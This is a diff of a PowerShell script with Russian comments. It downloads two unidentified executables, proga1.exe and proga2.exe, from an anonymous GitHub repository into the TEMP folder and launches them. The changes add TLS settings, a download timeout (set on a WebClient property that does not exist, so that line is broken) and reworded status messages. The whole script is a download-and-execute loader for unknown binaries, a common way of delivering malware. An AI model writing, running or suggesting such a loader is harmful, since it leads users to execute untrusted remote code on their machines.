@@ -43,6 +43,9 @@ try {
 Write-Host ""
 Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow
 
+# ПРИНУДИТЕЛЬНО ВКЛЮЧАЕМ TLS 1.2 (ОБЯЗАТЕЛЬНО ДЛЯ GITHUB)
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
+
 $temp = $env:TEMP
 $downloaded = 0
 
@@ -54,31 +57,51 @@ function Download-File {
     }
     
     Write-Host "Downloading from: $url" -ForegroundColor Gray
+    Write-Host "This may take up to 30 seconds..." -ForegroundColor Gray
     
+    # Используем .NET WebClient с таймаутом
     try {
         $webClient = New-Object System.Net.WebClient
+        $webClient.Timeout = 30000  # 30 секунд таймаут
+        
+        # Добавляем User-Agent (некоторые серверы требуют)
+        $webClient.Headers.Add("User-Agent", "PowerShell-Download-Script")
+        
+        # Скачиваем
         $webClient.DownloadFile($url, $dest)
         $webClient.Dispose()
         
-        if ((Get-Item $dest).Length -gt 0) {
-            Write-Host "Download SUCCESS: $((Get-Item $dest).Length / 1KB) KB" -ForegroundColor Green
-            return $true
+        # Проверяем результат
+        if (Test-Path $dest) {
+            $size = (Get-Item $dest).Length
+            if ($size -gt 0) {
+                Write-Host "SUCCESS: $([math]::Round($size/1KB, 2)) KB downloaded" -ForegroundColor Green
+                return $true
+            } else {
+                Write-Host "ERROR: Downloaded file is empty" -ForegroundColor Red
+                return $false
+            }
         } else {
-            Write-Host "Download FAILED: File is empty" -ForegroundColor Red
+            Write-Host "ERROR: File not created" -ForegroundColor Red
             return $false
         }
     } catch {
-        Write-Host "Download FAILED: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "DOWNLOAD FAILED: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
 
-Write-Host "Checking internet..." -ForegroundColor Gray
+# Проверка интернета с таймаутом
+Write-Host "Checking internet connection..." -ForegroundColor Gray
 try {
-    $null = Invoke-WebRequest -Uri "https://github.com" -TimeoutSec 5 -UseBasicParsing
-    Write-Host "Internet: OK" -ForegroundColor Green
+    $ping = Test-Connection -ComputerName "github.com" -Count 1 -Quiet -TimeoutSeconds 5
+    if ($ping) {
+        Write-Host "Internet: OK" -ForegroundColor Green
+    } else {
+        Write-Host "Internet: Warning - GitHub may be slow" -ForegroundColor Yellow
+    }
 } catch {
-    Write-Host "Internet: WARNING - $($_.Exception.Message)" -ForegroundColor Yellow
+    Write-Host "Internet: Check skipped" -ForegroundColor Gray
 }
 
 $url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
@@ -88,7 +111,7 @@ Write-Host "`n[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
 if (Download-File $url1 $dest1) {
     $downloaded++
 } else {
-    Write-Host "FAILED to download proga1.exe" -ForegroundColor Red
+    Write-Host "FAILED: proga1.exe" -ForegroundColor Red
 }
 
 $url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
@@ -114,7 +137,6 @@ Write-Host "=== Running Files ===" -ForegroundColor Yellow
 if (Test-Path $dest1) {
     Write-Host "Starting proga1.exe..." -ForegroundColor Green
     Start-Process -FilePath $dest1 -WindowStyle Normal
-    Write-Host "proga1.exe started" -ForegroundColor Green
 } else {
     Write-Host "proga1.exe not found!" -ForegroundColor Red
 }
@@ -123,13 +145,12 @@ if (Test-Path $dest2) {
     Start-Sleep -Seconds 2
     Write-Host "Starting proga2.exe..." -ForegroundColor Green
     Start-Process -FilePath $dest2 -WindowStyle Normal
-    Write-Host "proga2.exe started" -ForegroundColor Green
 } else {
     Write-Host "proga2.exe not found!" -ForegroundColor Red
 }
 
 Write-Host ""
-Write-Host "=== ALL DONE ($downloaded/2 files) ===" -ForegroundColor Green
+Write-Host "=== ALL DONE ($downloaded/2 files processed) ===" -ForegroundColor Green
 Write-Host ""
 Write-Host "Press any key to exit..." -ForegroundColor Gray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
